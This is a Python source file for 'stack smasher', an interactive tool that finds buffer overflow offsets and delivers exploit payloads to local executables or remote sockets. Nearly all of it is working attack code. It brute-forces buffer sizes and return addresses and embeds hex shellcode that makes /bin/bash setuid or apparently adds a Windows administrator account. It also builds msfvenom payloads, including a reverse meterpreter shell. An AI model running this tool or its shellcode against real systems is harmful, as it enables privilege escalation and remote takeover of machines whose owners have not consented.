#!/usr/bin/python3

import binascii
import argparse
from itertools import product
import select
import socket
import re
import string
import subprocess
import platform
import os

# Looks weird here IOT satisfy pylint's "anomalous backslash" complaints.
# Doesn't affect printing to console
titlepage = \
    """
########################################################################################################
#======================================================================================================#
#||                     _             _                              _                               ||#
#||                 ___| |_ __ _  ___| | __  ___ _ __ ___   __ _ ___| |__   ___ _ __                 ||#
#||                / __| __/ _` |/ __| |/ / / __| '_ ` _ \\ / _` / __| '_ \\ / _ \\ '__|                ||#
#||                \\__ \\ || (_| | (__|   <  \\__ \\ | | | | | (_| \\__ \\ | | |  __/ |                   ||#
#||                |___/\\__\\__,_|\\___|_|\\_\\ |___/_| |_| |_|\\__,_|___/_| |_|\\___|_|                   ||#
#||                                                                                                  ||#
#||                                                                                                  ||#
#======================================================================================================#
#||                                          stack smasher                                           ||#
#||                                               v0.2                                               ||#
#======================================================================================================#
#||                                                                                                  ||#
#||                                   Written by: Nicholas Morris                                    ||#
#||                             https://github.com/nm2438/stack_smasher                              ||#
#||                                                                                                  ||#
#||                                         Date: 06OCT2020                                          ||#
#||                                                                                                  ||#
#======================================================================================================#
#||    Tool for working with local and remote/socket-based buffer overflow exploits. Can             ||#
#||    overflow local executables with minimal user interaction. Remote exploits may require         ||#
#||    additional user effort. |!| Tools for bypassing stack canaries to be included in future       ||#
#||    release|!|                                                                                    ||#
#======================================================================================================#
########################################################################################################
"""


def ud():   # Temp
    print("Feature under development")
    input("\nPress ENTER to continue\n")

########################################################################################################
# Classes
########################################################################################################


class exploit:
    """
    Holds the variables needed to create and run a buffer overflow exploit
    """

    def __init__(self):
        """
        Initialize an exploit object
        """
        self.local_os = None
        self.target_os = None
        self.is_local = None
        self.target_exe = None
        self.stdin_or_arg = None
        self.trigger_arg = None
        self.target_ip = None
        self.target_port = None
        self.trigger_command = None
        self.buffer_size = None
        self.has_canary = None  # ud()
        self.target_eip = []
        self.prepend_nop_count = None
        self.append_nop_count = None
        self.shellcode = None
        self.payload = None

    def __str__(self):
        """
        Return string representation of exploit settings
        """
        string = "{\n"
        for key, value in self.__dict__.items():
            string += f"\t\"{key}\" : \"{value}\",\n"
        string += "}"
        return string

    def brief_descrip(self):
        """
        Print a brief description of the exploit
        """
        self.payload_generator(self.buffer_size, self.target_eip[0])
        return "\n" + \
            f"Is Local: {self.is_local}\n" + \
            f"Target exe: {self.target_exe}\n" + \
            f"Payload: {self.payload}\n"

    def save(self):
        """
        Writes exploit settings out to a file
        """
        default = f"{os.getcwd()}/stacksmash"
        path = get_filepath(
            "where you'd like to save your settings", default=default)
        with open(path, "w") as file:
            file.write(str(self))
        clear_screen()
        print("Saved the following settings:\n\n", self, sep="")
        input("\n\nPress ENTER to continue")

    def load(self, filename=None):
        """
        Loads exploit settings from a file
        """
        if filename == None:
            default = f"{os.getcwd()}/stacksmash"
            path = get_filepath("of your saved exploit", default=default)
        else:
            path = get_filepath("", already_exists=True, path=filename)
        with open(path, "r") as file:
            lines = file.readlines()
        for line in lines:
            if re.search(r'".+" : ".+"', line):
                words = line.split("\"")
                file_key, file_val = words[1], get_intended_type(words[3])
                for key in list(self.__dict__.keys()):
                    if key == file_key:
                        setattr(self, key, file_val)
                        break
        print("\nI loaded the following settings:\n\n", self, sep="")
        input("\n\nPress ENTER to continue")

    def get_trigger_cmd(self):
        response = get_input("\n#|| Do you need to prepend a specific command " +
                             "to trigger the vulnerability? (y/[n]):\n", ["y", "n", ""], default="n")
        if yn_key[response]:
            self.trigger_command = input("\n#|| Enter the command:\n").strip()
        else:
            self.trigger_command = "NA"

    def get_trigger_arg(self):
        response = get_input("\n#|| Do you need to include any switches or arguments " +
                             "to trigger the vulnerability? (y/[n]):\n", ["y", "n", ""], default="n")
        if yn_key[response]:
            self.trigger_arg = input(
                "\n#|| Enter everything needed (switches, args, etc.) between the executable " +
                "name and the payload on the cmdline:\n").strip()
        else:
            self.trigger_arg = "NA"

    def get_buffer_size(self):
        """
        Find the buffer size to trigger a buffer overflow
        """
        response = get_input("\n#|| Do you know your target's buffer size? (y/[n]):\n",
                             ["y", "n", ""], default="n")
        if yn_key[response]:
            response = get_input("\n#|| Enter buffer size:\n", [
                                 str(i) for i in range(10000)])
            self.buffer_size = int(response)
            return
        else:
            if self.is_local:
                # Linux process is easy, Windows not as much
                if self.local_os == "linux":
                    print("\n[*] Getting buffer size...")
                    successful_pattern = None
                    for size in range(100, 5000, 50):
                        if size % 100 == 0:
                            print(f"\t[*] Trying with pattern of size {size}")
                        pattern = gen_pattern(size)
                        init_dmesg = check_dmesg()
                        if self.stdin_or_arg == "stdin":
                            p1 = subprocess.Popen([self.target_exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                                  stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
                            p1.communicate(input=pattern)
                        elif self.stdin_or_arg == "arg":
                            p1 = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                                  stderr=subprocess.STDOUT, shell=True, universal_newlines=True)
                            p1.communicate(
                                input=(" ".join([self.target_exe, pattern])))
                        else:
                            print("\nMissing information\n")
                        new_dmesg = check_dmesg()
                        if new_dmesg[-1] != init_dmesg[-1]:
                            print(
                                "\t[*] Successfully triggered overflow. Calculating offset...")
                            successful_pattern = pattern
                            break
                    if successful_pattern == None:
                        print("\n#|| Unable to trigger overflow. Please calculate the offset " +
                              "manually and return")
                        return
                    interpret_dmesg(self, new_dmesg, successful_pattern)
                else:
                    # if local os is windows:
                    ud()
            else:
                print("\n#|| Manual entry is currently the only supported way of " +
                      "determining the buffer size for remote exploits\n")
                self.get_buffer_size()

    def get_target_eip(self):
        """
        Find the target eip
        """
        """
        Needs change
        Should have two paths -- already has at least one EIP or has no EIPS
            would you like to add more?
                keep adding until user wants to stop
            do you know your EIP? (you need to lol)
                keep adding until user wants to stop
        """
        if len(self.target_eip) > 0:
            print("\n#|| Your exploit currently has the following target EIPs saved:\n")
            for i in range(len(self.target_eip)):
                print(f"{i}:\t{self.target_eip[i]}")
            response = yn_key[get_input("\n#|| Would you like to add more target EIPs? (y/[n]):\n",
                                        ["y", "n", ""], default="n")]
        else:
            print("\n#|| Your exploit currently has no target EIPs\n")
            response = True

        if response:
            print(
                "\n#|| Correct EIP format examples: 625012a0 (32-bit) or ffffffff625012a0 (64-bit)")
            while True:
                response = input(
                    "\nEnter your next target EIP or \"b\" to go back:\n").strip()
                if response == "b" and (len(self.target_eip) > 0):
                    break
                elif response == "b":
                    print("\n#|| Sorry, you must have at least one target EIP!\n")
                else:
                    if re.search(r"[a|b|c|d|e|f|\d]{8}", response) or \
                            re.search(r"[a|b|c|d|e|f|\d]{16}", response):
                        self.target_eip.append(response)
                    else:
                        print("\n#|| Sorry, format not understood\n")

    def get_nop_counts(self):
        count_options = [str(2*n) for n in range(1000)]
        count_options.append("")
        if self.prepend_nop_count == None:
            response = get_input("#|| How many NOPS would you like to prepend? " +
                                 "(Enter a multiple of 2) [16]\n", count_options, default="16")
            self.prepend_nop_count = int(response)
        if self.append_nop_count == None:
            response = get_input("#|| How many NOPS would you like to append? " +
                                 "(Enter a multiple of 2) [16]\n", count_options, default="16")
            self.append_nop_count = int(response)

    def set_shellcode(self):
        """
        Gets input from user and sets exploit shellcode accordingly
        """
        while True:
            response = get_input("\n#|| How would you like to generate your payload?\n" +
                                 "\n[1] -- Use one of the built-in payloads\n2 -- Specify a msfvenom command" +
                                 " (can be done without leaving tool)\n3 -- Copy/Paste your shellcode into " +
                                 "the tool as a string\n", ["1", "2", "3", ""], default="1")
            if response == "1":
                # format:
                # description: (payload, args, bad_chars)
                available = {
                    "linux: chmod u+s /bin/bash (prebuilt, no msfvenom required)":
                    ("Preset", "Preset", "Preset"),
                    "windows: add Administrator account (u:root/p:root) (prebuilt, no " +
                    "msfvenom required)": ("Preset", "Preset", "Preset"),
                    "linux: chmod u+s /bin/bash": ("linux/x86/exec", "CMD=\"chmod u+s " +
                                                   "/bin/bash\"", "\\x00\\x0a\\x0d"),
                    "windows: reverse meterpreter": ("windows/meterpreter/reverse_tcp",
                                                     "LHOST=[] LPORT=[]", "\\x00\\x0a\\x0d")
                }
                print("\nThe following preset payloads are available:")
                keys = list(available.keys())
                values = list(available.values())
                for i in range(len(keys)):
                    print(f"{i} : {keys[i]}")
                options = [str(i) for i in range(len(keys))]
                options.append("b")
                response = get_input("\nEnter your selection: (0,2,...,n):\nOr, enter \"b\" to go back\n",
                                     options)
                if response == "b":
                    continue
                elif response == "0":
                    self.shellcode = \
                        "6a0b58995266682d6389e7682f736800682f62696e89e352e81400000063686d6f6420752b73202f6" + \
                        "2696e2f6261736800575389e1cd80"
                    break
                elif response == "1":
                    self.shellcode = \
                        "ba19a5b4d8d9cbd97424f45f2bc9b14783effc31570f035716474124c005aad5106a223021aa5030" + \
                        "111a12149dd1768d16975ea29f12b98d200ef98ca24d2e6f9b9d236edcc0ce22b58f7dd3b2da" + \
                        "bd5888cbc5bd58ede413d3b4269530cd6e8d55e83926ad86bbeefc6717cf319a6917f5451c6106" + \
                        "fb27b67527ad2dddac158adc61c359d2ce8706f6d1443d02596b9283194836c8faf16fb4ad0e6f" + \
                        "1711abfbb546c6a1d39954dc919a66df85f257544a8467bf2f7a22e21913eb76187e0cad5e878f" + \
                        "441e7c8f2c1b3817dc5151f2e2c652d79387dbbd21244c5baaa6a2c64a539b46eecffb03a3aaa9" + \
                        "8b315b21b895d1d22fa23502d12e517c3ed6b9532550c9c2d7c55a2f7663ea2af4505cf0ac862c" + \
                        "b50f86e00ec247adc0c216298c6bf7d83d18757bb68f0b081622838122e2743caf868a"
                    break
                else:
                    i = int(response)
                    payload = values[i][0]
                    args = values[i][1]
                    bad_chars = values[i][2]
                    while True:
                        print(f"\nPayload: {payload}\n" +
                              f"\nArguments: {args}" +
                              f"\nBad Characters: {bad_chars}\n")
                        response = get_input("Would you like to edit one or more of the variables? (p/a/b/[n](no))",
                                             ["p", "a", "b", "n", ""], default="n")
                        if response == "n":
                            break
                        elif response == "p":
                            payload = input("\nEnter the new value:\n").strip()
                        elif response == "a":
                            args = input("\nEnter the new value:\n").strip()
                        elif response == "b":
                            bad_chars = input(
                                "\nEnter the new value:\n").strip()
                    self.shellcode = get_venom(payload, args, bad_chars)
                    break
            elif response == "2":
                while True:
                    payload = input("\nWhat msfvenom payload do you want to use?\n\t" +
                                    "Note:Error-checking is limited here, enter input carefully\n").strip()
                    args = input(
                        "\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
                    bad_chars = input(
                        "\nEnter any bad characters: (e.g. \"\x00\x0a\x0d\")\n").strip()
                    if check_input():
                        break
                self.shellcode = get_venom(payload, args, bad_chars)
                break
            else:
                while True:
                    payload = input(
                        "\nPaste your shellcode as a single line. Omit any quotes.\n")
                    if check_input():
                        break
                self.shellcode = payload.replace("\\x", "")
                break
            response = None

    def get_info(self):
        """
        Get info from the user regarding exploit
        """
        plat_string = platform.system().strip().lower()
        if "linux" in plat_string:
            self.local_os = "linux"
        elif "windows" in plat_string:
            self.local_os = "windows"
        else:
            print("\n#|| Cannot reliably determine host OS")
            response = get_input("#|| What OS are you running? ([l]=linux/w=windows):\n",
                                 ["l", "w", ""], default="l")
            os_key = {"l": "linux", "w": "windows"}
            self.local_os = os_key[response]
        print(f"\n[*] Identified local OS as: {self.local_os.capitalize()}\n")

        # Is it local?
        if self.is_local == None:
            response = get_input(
                "#|| Is your target local? ([y]/n):\n", ["y", "n", ""], default="y")
            self.is_local = yn_key[response]

        # Split paths for local/remote
        if self.is_local:
            if self.target_exe == None:
                self.target_exe = get_filepath(
                    "of your target", already_exists=True)
            if self.stdin_or_arg == None:
                response = get_input(
                    "\n#|| Does your target accept the payload through stdin or cmdline argument? " +
                    "([s]/c):\n", ["s", "c", ""], default="s")
                if response == "s":
                    # Stdin
                    self.stdin_or_arg = "stdin"
                    if self.trigger_command == None:
                        self.get_trigger_cmd()
                elif response == "c":
                    # Cmdline Arg
                    self.stdin_or_arg = "arg"
                    if self.trigger_arg == None:
                        self.get_trigger_arg()
            if self.buffer_size == None:
                self.get_buffer_size()
            self.get_target_eip()
            if self.prepend_nop_count == None or self.append_nop_count == None:
                self.get_nop_counts()
            if self.shellcode == None:
                self.set_shellcode()

        else:
            # get info for remote buffer overflow exploits
            print(
                "\n#|| Remote buffer overflows require two stages: analysis and exploitation")
            print("Note: Analysis module still under development\n")    # temp
            if self.target_ip:
                # IP has already been defined, indicating that definition has already happened
                response = ""
            else:
                response = get_input("\n#|| Enter analysis module or exploitation module? (a/[e]):\n",
                                     ["a", "e", ""], default="e")
            if response == "a":
                ud()
            elif response == "e":
                while not self.target_ip:
                    response = input(
                        "\n#|| Enter your target's IP address:\n").strip()
                    if re.search(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", response):
                        self.target_ip = response
                    else:
                        print("\n#|| Sorry, I didn't understand that\n")
                if self.target_port == None:
                    response = get_input("\n#|| Enter the target port:\n", [
                                         str(i) for i in range(65536)])
                    self.target_port = int(response)
                if self.trigger_command == None:
                    self.get_trigger_cmd()
                if self.buffer_size == None:
                    self.get_buffer_size()
                self.get_target_eip()
                if self.prepend_nop_count == None or self.append_nop_count == None:
                    self.get_nop_counts()
                if self.shellcode == None:
                    self.set_shellcode()

    def payload_generator(self, buffer_size, target_eip):
        '''
        Generates the overflow-triggering message
        '''
        # put EIP in correct order
        eip = ""
        for i in range(len(target_eip)):
            if i % 2 == 0:
                eip = target_eip[i:i+2] + eip

        if not self.has_canary:
            if not self.trigger_command or self.trigger_command == "NA":
                msg = "41"*buffer_size
            else:
                msg = "".join([str(hex(ord(char))).replace("0x", "")
                               for char in self.trigger_command])
                msg += "41"*(buffer_size - len(self.trigger_command))
            msg += eip
            msg += "90"*self.prepend_nop_count
            msg += self.shellcode
            msg += "90"*self.append_nop_count
        else:
            pass    # under construction
        self.payload = bytearray.fromhex(msg)

    def run(self):
        """
        Runs the exploit (i.e. delivers the payload to the target)
        """
        missing = "\nLooks like something's missing!\n"
        if self.is_local:
            # All local exploits
            if self.local_os == "linux":
                # Local Linux
                if self.buffer_size != None and (len(self.target_eip) > 0) and \
                        self.prepend_nop_count != None and self.shellcode != None\
                        and self.append_nop_count != None:
                    cmd_string = self.target_exe
                    sudo = yn_key[get_input("\nShould I run command as sudo? ([y]/n)\n",
                                            ["y", "n", ""], default="y")]
                    if sudo:
                        cmd_string = "sudo " + cmd_string
                else:
                    print(missing)
                    input("Press ENTER to Return")
                    return
            elif self.local_os == "windows":
                # Local Windows
                ud()
            # Back to all local exploits
        elif self.is_local == False:
            # All remote exploits
            if self.target_ip != None and self.target_port != None and \
                    self.buffer_size != None and (len(self.target_eip) > 0) \
                    and self.prepend_nop_count != None and self.shellcode != None \
                    and self.append_nop_count != None:
                pass
            else:
                print(missing)
                input("Press ENTER to Return")
                return
        else:
            # .is_local failed to be defined
            print(missing)
            input("Press ENTER to Return")
            return

        buffer_interval = int(get_input("\nEnter a confidence interval for your buffer size: " +
                                        "(0-1000) [1]\n" +
                                        "For interval = n, I will conduct an attempt for every buffer size in range " +
                                        "(nominal - n, nominal + n)\n",
                                        [str(i) for i in range(1001)], default="0"))

        eip_interval = int(get_input("\nEnter a confidence interval for your target EIP: " +
                                     "(0-1000) [1]\n" +
                                     "For interval = n, I will conduct an attempt for every EIP in range " +
                                     "(nominal - (1 byte)*n, nominal + (1 byte)*n)\n" +
                                     "For interval = n, I will conduct 2*(n+1) attempts\n",
                                     [str(i) for i in range(1001)], default="0"))

        print("\n[*] Sending payload(s)!")

        # the given eip will be run twice (add zero, subtract zero)
        responses = []

        for buffer_size in range(self.buffer_size - buffer_interval,
                                 1+self.buffer_size+buffer_interval):
            for eip in self.target_eip:
                for n in range(1+eip_interval):
                    for num in [-n, n]:
                        current_eip = str(
                            hex(int(eip, 16) + 8*num)).replace("0x", "")
                        self.payload_generator(buffer_size, current_eip)
                        if self.is_local:
                            if self.stdin_or_arg == "stdin":
                                p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE,
                                                     stdout=subprocess.PIPE,
                                                     stderr=subprocess.STDOUT, shell=True)
                                out = p.communicate(input=self.payload)[
                                    0].decode()
                                responses.append(
                                    list(filter(lambda a: a != "", out.split("\n")))[-1])
                                print("\t[*] Sent!")
                            elif self.stdin_or_arg == "arg" and self.local_os == "linux":
                                string = binascii.hexlify(
                                    self.payload).decode()
                                lit_string = r"\x".join(
                                    [string[i:i+2] for i in range(0, len(string), 2)])
                                lit_string = r"$'\x" + lit_string + r"'"
                                if self.trigger_arg == None or self.trigger_arg == "NA":
                                    cmd = " ".join([cmd_string, lit_string])
                                else:
                                    cmd = " ".join(
                                        [cmd_string, self.trigger_arg, lit_string])
                                p = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE,
                                                     stdout=subprocess.PIPE,
                                                     stderr=subprocess.STDOUT)
                                cmd = bytearray(cmd, "utf-8")
                                try:
                                    out = p.communicate(input=cmd)[0]
                                    responses.append(out)
                                    print("\t[*] Sent!")
                                except Exception as e:
                                    print("\t[*] Error -- Don't worry, this is normal\n" +
                                          f"\tError: {e}")
                            else:
                                print(missing)
                        else:
                            s = socket.socket(
                                socket.AF_INET, socket.SOCK_STREAM)
                            try:
                                s.connect((self.target_ip, self.target_port))
                                s.send(self.payload)
                                # Retrieve message if one is sent back
                                s.setblocking(0)
                                ready = select.select([s], [], [], 0.1)
                                if ready[0]:
                                    out = s.recv(8192)
                                responses.append(
                                    "".join(out.decode().split("\n")[-2:]))
                                print("\t[*] Sent!")
                            except:
                                print(
                                    "\t[*] ERROR Sending (Most likely a refused connection)")

        show = get_input("\nSaved last line of output from each attempt. View now? (y/[n])\n",
                         ["y", "n", ""], default="n")
        if yn_key[show]:
            for line in responses:
                print("\t",line,sep="")
        input("\nFinished. Press ENTER to return.")


########################################################################################################
# Application-Specific Functions
########################################################################################################


def check_dmesg():
    """
    Get dmesg output on linux
    """
    dmesg = subprocess.check_output("dmesg | tail", stderr=subprocess.STDOUT,
                                    shell=True, universal_newlines=True)
    if "not permit" in dmesg:
        print("[*] Need sudo for dmesg. Trying now...")
        dmesg = subprocess.check_output("sudo dmesg | tail", stderr=subprocess.STDOUT,
                                        shell=True, universal_newlines=True)
    dmesg = dmesg.split("\n")
    # print(dmesg)    # Debug
    # Remove any lines without at least three consecutive non-whitespace characters
    for line in dmesg:
        if not re.search(r"\S{3,}", line):
            dmesg.remove(line)
    return dmesg


def interpret_dmesg(exp, dmesg, successful_pattern):
    """
    Get useful information from dmesg output
    """
    err = ""
    for i in range(1, 1+len(dmesg)):
        if "ip" in dmesg[-i] and "sp" in dmesg[-i]:
            err = dmesg[-i]
            print("\n"+err+"\n")
            break
   # print(last_line)    # Debug
    ip, sp = None, None
    if "ip" in err and "sp" in err:
        err = err.split()
        for i in range(len(err)):
            if err[i] == "ip":
                # handle 64 and 32 bit programs differently
                if err[i+1][:8] != "00000000":
                    ip = err[i+1]
                else:
                    ip = err[i+1][-8:]
            elif err[i] == "sp":
                if err[i+1][:8] != "00000000":
                    sp = err[i+1]
                else:
                    sp = err[i+1][-8:]
    if ip == None or sp == None:
        print("\n#|| Unable to read dmesg output. Please read output manually " +
              "and enter the following values:\n#|| \tNote: Error catching here is " +
              "limited, please enter input carefully\n(64 bit programs should have 16 " +
              "digit addresses, 32 bit programs should have 8 digit addresses)\n")
        while True:
            print("\n#|| IP should look like: `400971` (value chosen arbitrarily)")
            ip = input("#|| Enter the IP (hex value only):\n")
            print("#\n|| SP should look like: `ffffe5b8` (value chosen arbitrarily)")
            sp = input("#|| Enter the SP (hex value only):\n")
            if check_input():
                break
    exp.target_eip.append(sp)
    exp.buffer_size = calculate_offset(successful_pattern, ip)
    print(
        f"[*] Identified buffer size as {exp.buffer_size} and target EIP(s) as {exp.target_eip}")


def get_venom(payload, args, bad_chars):
    cmd_string = "msfvenom -p " + payload
    if len(args) > 1:
        cmd_string += " " + args
    if len(bad_chars) > 1:
        cmd_string += " -b " + bad_chars
    cmd_string += " -f python"

    output = subprocess.check_output(
        cmd_string, shell=True, universal_newlines=True)
    venom = [line for line in output.split("\n") if "buf +=" in line]
    for line in venom:
        i = line.find("\"")
        line = line[i+1:line.find("\"", i+1)]
    venom = "".join(venom)
    venom = venom.replace("\\x", "")
    return venom


def gen_pattern(size):
    # Initialize variables
    uppers = string.ascii_uppercase
    downers = string.ascii_lowercase
    digis = string.digits

    pattern_iter = iter(product(uppers, downers, digis))
    pattern = ""
    for _ in range(0, size, 3):
        pattern += "".join(next(pattern_iter))

    return pattern


def calculate_offset(pattern, register):
    chars = ""
    for i in range(len(register)):
        if i % 2 == 0:
            chars = chr(int(register[i:i+2], 16)) + chars
    # print(register + "\n" + chars)    # Debug
    return pattern.index(chars)


def change_setting(exp):
    clear_screen()
    print("Current Exploit Settings:\n\n", exp, "\nNote: It's quite easy to " +
          "render your exploit unusable by incorrectly editing the settings!\n", sep="")
    num_opt = len(exp.__dict__)
    keylist = list(exp.__dict__.keys())
    options = ["#|| {} -- "+f"{keylist[i]}" for i in range(num_opt)]
    options.append("#|| {} -- Return to the Previous Menu")
    choice = get_menu_choice("\n#|| Which setting would you like to change? " +
                             "(Press corresponding number for your menu choice):\n", options)
    if choice == num_opt:
        return
    else:
        while True:
            user_inpt = input("\nNote: NO INPUT VALIDATION IN THIS MENU\n" +
                              "Enter the new value for this setting:\n").strip()
            if check_input():
                break
        exp.__setattr__(keylist[choice], get_intended_type(user_inpt))


def exploit_handler(exp):
    """
    Meta-method to guide the entire process of exploit development and running
    """
    exp.get_info()
    header = "Welcome to the Exploit Menu"
    options = [
        "#|| {} -- VIEW EXPLOIT SETTINGS",
        "#|| {} -- CHANGE EXPLOIT SETTINGS",
        "#|| {} -- SAVE EXPLOIT SETTINGS",
        "#|| {} -- RUN EXPLOIT",
        "#|| {} -- EXIT EXPLOIT HANDLER"
    ]
    while True:
        clear_screen()
        choice = get_menu_choice(header, options)
        if choice == 0:
            clear_screen()
            print("Current Exploit Settings:\n\n", exp)
            input("\nPress ENTER to go back\n")
        elif choice == 1:
            change_setting(exp)
        elif choice == 2:
            exp.save()
        elif choice == 3:
            exp.run()
        elif choice == 4:
            break
        else:
            input("Invalid option")
        choice = None


def main_menu(choice=None, filename=None):
    while True:
        if choice == None:
            options = [
                "#|| {} -- HELP",
                "#|| {} -- [NEW : Begin New Exploit]",
                "#|| {} -- LOAD : Load Saved Exploit from File",
                "#|| {} -- SELECT : Select one of the currently loaded exploits and " +
                "enter the exploit menu",
                "#|| {} -- EXIT"
            ]
            choice = get_menu_choice("Main Menu", options, default="1")

        if choice == 0:
            # parser.print_help()
            ud()
        elif choice == 1:
            print("Beginning New Exploit...")
            exploits.append(exploit())
            exploit_handler(exploits[-1])
        elif choice == 2:
            exploits.append(exploit())
            exploits[-1].load(filename)
            exploit_handler(exploits[-1])
        elif choice == 3:
            clear_screen()
            options = ["#|| Index: {}\n"+exploits[i].brief_descrip()
                       for i in range(len(exploits))]
            options.append("\n#|| {} -- Return to Previous Menu")
            choice = get_menu_choice("Available Exploits", options)
            if choice == len(exploits):
                pass
            else:
                exploit_handler(exploits[choice])
        elif choice == 4:
            print("#|| Goodbye!")
            break
        choice = None
        filename = None
        clear_screen()


########################################################################################################
# General Purpose Functions
########################################################################################################


def check_input():
    """
    Asks user to verify their own input
    """
    return yn_key[get_input("\n#|| Does your input look correct? ([y]/n):\n", ["y", "n", ""], default="y")]


def get_intended_type(string):
    """
    Takes a string, returns the intended value/data type. Used for reading in a settings file
    """
    if re.search(r"\[.*\]", string):
        newstr = re.sub(r"[\[|\]|,|\s]", "", string)
        result = re.split(r"[\"|\']", newstr)
        # Remove null entries
        result = list(filter(lambda a: a != "", result))
        return result
    elif string == "None":
        return None
    elif string == "True":
        return True
    elif string == "False":
        return False
    else:
        try:
            return int(string)
        except:
            pass
    return string


def get_filepath(path_of, already_exists=False, default=None, path=None):
    """
    Get a filepath from the user and check that it's valid
    """
    while True:
        if path == None:
            print(f"#|| Enter the file path {path_of}:\n")
            if default:
                print("Press ENTER to use default filepath" +
                      f"\nDefault filepath: {default}\n")
            response = input().strip()
        else:
            response = path

        if response == "" and default:
            return default
        elif already_exists:
            if os.path.exists(response):
                if "/" not in response and "\\" not in response:
                    response = "./" + response
                return response
            else:
                print("#|| Not a valid file path")
                if path != None:
                    quit()
        else:
            dirname = os.path.dirname(response) or os.getcwd()
            if os.access(dirname, os.W_OK):
                if "/" not in response and "\\" not in response:
                    response = "./" + response
                return response
            else:
                print("#|| Not a valid file path")


def clear_screen():
    """
    Attempts to clear the screen
    """
    try:
        if "windows" in platform.system().strip().lower():
            os.system("cls")
        else:
            os.system("clear")
    except:
        pass


def print_line(frmt, wdth, lines):
    '''
    Description:
        Prints the arguments in a pre-set manner
    Args:
        frmt - str
        wdth - int
        lines - list
    Returns:
        None
    '''
    [print(frmt.format(item, wdth)) for item in lines]


def listerator(text, wdth):
    '''
    Description:
        Breaks up a long string into a list of strings that fit
        nicely into a box of the given width
    Args:
        text - str
        wdth - width
    Returns:
        list of strings
    '''
    word_lst = list(text.split())
    word_lst.reverse()

    lines = ['']
    ctr = 0
    for _ in range(len(word_lst)):
        if len(lines[ctr]) + len(word_lst[-1]) + 1 > wdth:
            ctr += 1
            lines.append('')
        new_word = word_lst.pop()
        if not len(lines[ctr]) == 0:
            new_word = ' ' + new_word
        lines[ctr] += new_word
    return lines


def print_block(text, width, line, pad):
    '''
    Description:
        Formats a very long string into a nice block of text
    Args:
        text - str - a string to be printed
        width - int - the width of the 'box' to print in
        line - str - the string representation of the upper/lower box border
        pad - int - number of spaces between box border and text block
    Returns:
        None
    '''
    # generate box dimensions, formats
    txt_wdth = width-(2*pad)-6
    #num_lines = (len(text)//txt_wdth)+1
    if commented_output:
        frmt = '#||{1}{0}{1}||#'.format('{0:<{1}}', ' '*pad)
    else:
        frmt = '\\#||{1}{0}{1}||\\#'.format('{0:<{1}}', ' '*pad)

    # print block
    print(line)
    print_line(frmt, txt_wdth,
               listerator(text, txt_wdth))
    print(line)


def get_menu_choice(header, options, default=None):
    print_block(header, pagewidth, border_line, 8)
    print("\n")
    [print(options[i].format(i)) for i in range(len(options))]
    print("\n")
    choices = [str(i) for i in range(len(options))]
    prompt = f"\nMake your selection: (0..{len(options)-1}):\n"
    if default:
        choices.append("")
        choice = get_input(prompt, choices, default=default)
    else:
        choice = get_input(prompt, choices)
    return int(choice)


def get_input(prompt, valid, default=None):
    '''
    Gets and verifies user's menu choice
    '''
    while True:
        raw_input = input(prompt).strip().lower()
        if raw_input in valid:
            if raw_input == "" and default:
                raw_input = default
            return raw_input
        else:
            print("#|| Sorry, I didn't understand that\n")


########################################################################################################
# Main
########################################################################################################


if __name__ == "__main__":
    # Global Variables
    pagewidth = 104
    border_line = '#'*pagewidth
    commented_output = True
    yn_key = {'y': True, 'n': False}
    exploits = []

    # Argument Parsing
    parser = argparse.ArgumentParser(description="A tool for conducting local and " +
                                     "remote/socket-based buffer overflows.")
    parser.add_argument("-i", "--interactive",
                        help="open script in interactive mode", action="store_true")
    parser.add_argument("-l", "--load",
                        help="load: specify a file from which to load an exploit")
    args = parser.parse_args()

    if args.interactive:
        # Welcome Page, only displays on start
        clear_screen()
        print(titlepage)
        welcome = \
            "stacksmasher can be run through the interactive menu or with command line switches. " + \
            "To see the command line switches, select \"Help\" or run" + \
            " `./stack_smasher.py -h` from the command line.\n"
        print_block(welcome, pagewidth, border_line, 8)
        input("\nPress ENTER to continue\n")
        clear_screen()
        main_menu()
    elif args.load:
        main_menu(choice=2, filename=args.load)
    else:
        parser.print_help()
